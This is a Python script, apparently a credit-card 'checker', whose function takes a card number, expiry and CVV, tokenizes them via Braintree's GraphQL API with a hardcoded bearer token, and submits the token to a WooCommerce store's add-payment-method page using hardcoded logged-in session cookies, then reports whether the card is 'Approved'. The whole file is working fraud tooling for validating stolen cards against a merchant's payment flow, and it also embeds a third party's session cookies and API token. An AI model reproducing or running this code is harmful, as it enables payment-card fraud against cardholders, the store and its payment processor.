def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
























































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ4OTIxNzMsImp0aSI6IjE4OWQ2MTRmLTAyNmQtNDgxNS04ZGU5LWMyYWExMjYzY2YyMiIsInN1YiI6InF5anJxNDR6Y2Q2czMyOWoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF5anJxNDR6Y2Q2czMyOWoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.YZ4oXeD97v5eJWsjxvbLw7rdKr549P59Q54VZ6Ew3X_z432wRGM3ga6sHSM2diNzwWBHivvWb7u9MkbcMaZ_qw',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '9a814398-d870-4db6-aac8-09c8ae2337f0',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

#4

	cookies = {
    '_ga': 'GA1.1.1015169626.1733746575',
    'cookie_notice_accepted': 'true',
    'wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4': 'bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687',
    'wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4': '162%7C%7C1734966100%7C%7C1734962500%7C%7Cd6f69041f5dfd6175977b9a5aecc5449',
    'wfwaf-authcookie-8c84895040128b898589b5670ddc8148': '162%7Cother%7Cread%7C6e822796ca100f2f11639fe737887f3cff44c9cd359681ebaeefe058da203913',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'fa607743e2ceb4617ba4278dc72a2064',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_50RCK7EFBE': 'GS1.1.1734805383.10.1.1734805771.0.0.0',
}

	headers = {
    'authority': 'identityfashion.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1015169626.1733746575; cookie_notice_accepted=true; wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4=bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687; wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4=162%7C%7C1734966100%7C%7C1734962500%7C%7Cd6f69041f5dfd6175977b9a5aecc5449; wfwaf-authcookie-8c84895040128b898589b5670ddc8148=162%7Cother%7Cread%7C6e822796ca100f2f11639fe737887f3cff44c9cd359681ebaeefe058da203913; woocommerce_items_in_cart=1; woocommerce_cart_hash=fa607743e2ceb4617ba4278dc72a2064; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; _ga_50RCK7EFBE=GS1.1.1734805383.10.1.1734805771.0.0.0',
    'origin': 'https://identityfashion.online',
    'pragma': 'no-cache',
    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '13.98',
    'wc_braintree_credit_card_payment_nonce':tok,
    'wc_braintree_device_data': '{"correlation_id":"aef16a868e86fc9b1c3acd7a2d2c92a2"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '28cb6b5997',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://identityfashion.online/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	text = response.text
	pattern = r'Status code (.*?)\s*</li>'

	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'authenticate_rejected' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

